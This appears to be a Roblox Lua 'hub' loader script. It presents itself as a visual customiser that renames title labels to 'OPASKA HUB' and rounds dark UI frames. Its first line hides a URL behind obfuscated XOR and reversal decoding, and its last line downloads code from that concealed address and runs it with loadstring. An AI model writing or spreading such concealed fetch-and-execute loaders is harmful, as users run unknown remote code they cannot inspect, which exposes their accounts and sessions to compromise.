
--[[ STAGE 2: VISUAL CORE ]]
local VHZcNXTy9WLaeozvMuqgm="\142\160\185\155\023\179\193\210\029\234\221\239\049\248\251\244\068\009\013\007\019\039\039\030\050\114\119\135\069\075\084\089\082"local MfWc3PeUR3yvi=66 local YpkRMbfNxvk5Cy=113 local PfzVNqde_zBE64d52Rj=0 local LuoN69o2TYgVN8pXvI=5 local sBXnziAxKq9pCgQdToK=18 local dUb9jDQLQE3xCg_=true local pKzI10QKp0OSS8a5=bit32 and bit32.bxor if not pKzI10QKp0OSS8a5 then pKzI10QKp0OSS8a5=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local mCZBS5bbBayJEeR8AUW={}for nu8gvee6DMkgPxLa=1,#VHZcNXTy9WLaeozvMuqgm do local sgR47_RocyL39L=string.byte(VHZcNXTy9WLaeozvMuqgm,nu8gvee6DMkgPxLa)local r0aaUjdFNBnyHNvRIhu0L=(YpkRMbfNxvk5Cy+(nu8gvee6DMkgPxLa*LuoN69o2TYgVN8pXvI)+sBXnziAxKq9pCgQdToK)%256 if PfzVNqde_zBE64d52Rj==0 then sgR47_RocyL39L=(sgR47_RocyL39L-r0aaUjdFNBnyHNvRIhu0L)%256 mCZBS5bbBayJEeR8AUW[nu8gvee6DMkgPxLa]=string.char(pKzI10QKp0OSS8a5(sgR47_RocyL39L,MfWc3PeUR3yvi))else sgR47_RocyL39L=pKzI10QKp0OSS8a5(sgR47_RocyL39L,MfWc3PeUR3yvi)mCZBS5bbBayJEeR8AUW[nu8gvee6DMkgPxLa]=string.char((sgR47_RocyL39L-r0aaUjdFNBnyHNvRIhu0L)%256)end end local GXCQq8l8UWy57=table.concat(mCZBS5bbBayJEeR8AUW)if dUb9jDQLQE3xCg_ then GXCQq8l8UWy57=string.reverse(GXCQq8l8UWy57)end local N1vurfAotV4hOgw=GXCQq8l8UWy57
local HubName = "OPASKA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(N1vurfAotV4hOgw))()
